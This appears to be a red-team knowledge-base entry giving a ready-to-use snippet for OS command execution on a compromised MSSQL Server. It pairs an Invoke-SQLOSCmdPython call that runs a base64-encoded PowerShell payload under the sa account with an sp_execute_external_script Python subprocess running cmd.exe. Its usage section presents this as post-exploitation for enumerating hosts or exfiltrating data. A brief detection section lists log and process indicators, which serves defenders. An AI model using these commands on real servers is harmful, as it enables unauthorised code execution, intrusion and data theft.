---
id: 2cf7d60b-b4ab-4cb6-bb2f-15cfbb26764c
name: MSSQL-Python-and-PowerShell-Execution-Script
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:20.606248+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - mssql
  - powershell
  - python
  - execution
validated: true
---

# MSSQL-Python-and-PowerShell-Execution-Script

## Code

```ps1
Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose

EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
WITH RESULT SETS (([cmd_out] nvarchar(max)))
```

## Description

This code snippet demonstrates combined execution of a base64-encoded PowerShell script and a Python subprocess call on an MSSQL Server instance. The PowerShell part uses a custom Invoke function to run OS commands, while the Python part executes via sp_execute_external_script to capture system information like current user. It's useful for initial reconnaissance or payload testing in SQL-compromised environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| sa | SQL username (placeholder; use actual) | sa |
| Password1234 | SQL password (placeholder; insecure example) | StrongPassword123! |
| <DBSERVERNAME\DBInstance> | Target SQL instance | localhost\SQLEXPRESS |
| <base64encodedscript> | Base64-encoded PowerShell payload | JAB... (base64 of 'whoami') |
| cmd.exe /c whoami | Example OS command in Python | dir C:\ |

## Usage

Load this in a PowerShell session connected to SQL Server management tools (e.g., via sqlps module). First, prepare the base64 script on attacker side, then run the Invoke line. Follow with the SQL EXEC in SSMS or sqlcmd. Used in post-exploitation after gaining SQL creds, e.g., to enumerate host or exfil data. Reference in procedures like [[procedures/MSSQL-Execute-Python-and-PowerShell-Scripts]].

## Detection

- SQL Server error logs showing sp_execute_external_script invocations or external script errors.
- PowerShell operational logs (Event ID 4104) for base64 decodes or unusual module loads.
- Process monitoring: sqlservr.exe spawning cmd.exe or python.exe subprocesses.
- Network: Unusual outbound connections from SQL Server if script includes downloads.

## Related

- [[procedures/MSSQL-Execute-Python-and-PowerShell-Scripts]]
- [[commands/mssql-invoke-sqloscmdpython-powershell-execution]]
